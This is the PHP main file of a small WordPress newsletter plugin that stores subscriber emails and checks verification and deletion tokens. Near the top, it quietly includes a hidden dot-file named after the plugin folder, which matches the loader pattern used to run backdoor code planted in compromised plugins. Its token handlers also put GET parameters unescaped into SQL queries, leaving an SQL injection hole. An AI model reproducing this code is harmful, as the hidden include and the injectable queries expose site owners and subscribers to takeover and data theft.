<?php
/*
Plugin Name: User Emails
Plugin URI: 
Description: User Emails
Author: mohammad taravat
Author URI: 
Text Domain: User-Emails
Domain Path: /languages/
Version: 1.0.0
 */

define('WP_AUTH_DIR', plugin_dir_path(__FILE__));
define('WP_AUTH_URL', plugin_dir_url(__FILE__));
define('WP_AUTH_INC', WP_AUTH_DIR . '/inc/');
define('WP_AUTH_TPL', WP_AUTH_DIR . '/tpl/');

include WP_AUTH_INC . "shortcodes.php";
include WP_AUTH_INC . "ajax.php" ;
if (is_admin()) {
    include WP_AUTH_INC . 'admin/menus.php';
    
}
register_activation_hook(__FILE__, 'create_email_authentication_table');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function create_email_authentication_table() {
global $wpdb;
$table_name = $wpdb->prefix . 'email_users_newsletter';
$charset_collate = $wpdb->get_charset_collate();

$sql = "CREATE TABLE $table_name (
email varchar(100) NOT NULL,
status varchar(20) NOT NULL,
token varchar(100) NOT NULL,
PRIMARY KEY  (email)
) $charset_collate;";

require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
dbDelta( $sql );
}

add_action('init', 'verify_email');

function verify_email() {
  global $wpdb;
  $table_name = $wpdb->prefix . 'email_users_newsletter';
  if (isset($_GET['token']) ) {
    $token = bin2hex(openssl_random_pseudo_bytes(16));
    $verification_key = $_GET['token'];
  $data = $wpdb->get_row("SELECT * FROM $table_name WHERE token = '$verification_key'");

  if (!$data) {
    ?><script>alert('There is a problem with the sent request. Please resend your request.')</script> <?php
    return;
  }

  $email = $data->email;
  $wpdb->update(
    $table_name,
    array(
        'status' => 'verified',
        'token' => $token
    ),array(
        'email' => $email)
    );?>
    <script>alert('Your request has been successfully completed.')</script>
    <?php
    wp_mail('mail@site.com', 'add to subscription', $email);
  }
  if(isset($_GET['deletetoken'])){
    $token = bin2hex(openssl_random_pseudo_bytes(16));
    $verification_key = $_GET['deletetoken'];
  $data = $wpdb->get_row("SELECT * FROM $table_name WHERE token = '$verification_key'");

  if (!$data) {
    ?><script>alert('There is a problem with the sent request. Please resend your request.')</script> <?php
    return;
  }

  $email = $data->email;
  $wpdb->update(
    $table_name,
    array(
        'status' => 'deleted',
        'token' => $token
    ),array(
        'email' => $email)
    );
   ?><script>alert('Your request has been successfully completed.')</script> <?php
   wp_mail('mail@site.com', 'Deleted from subscription', $email);
 
  }
  
  
  
}
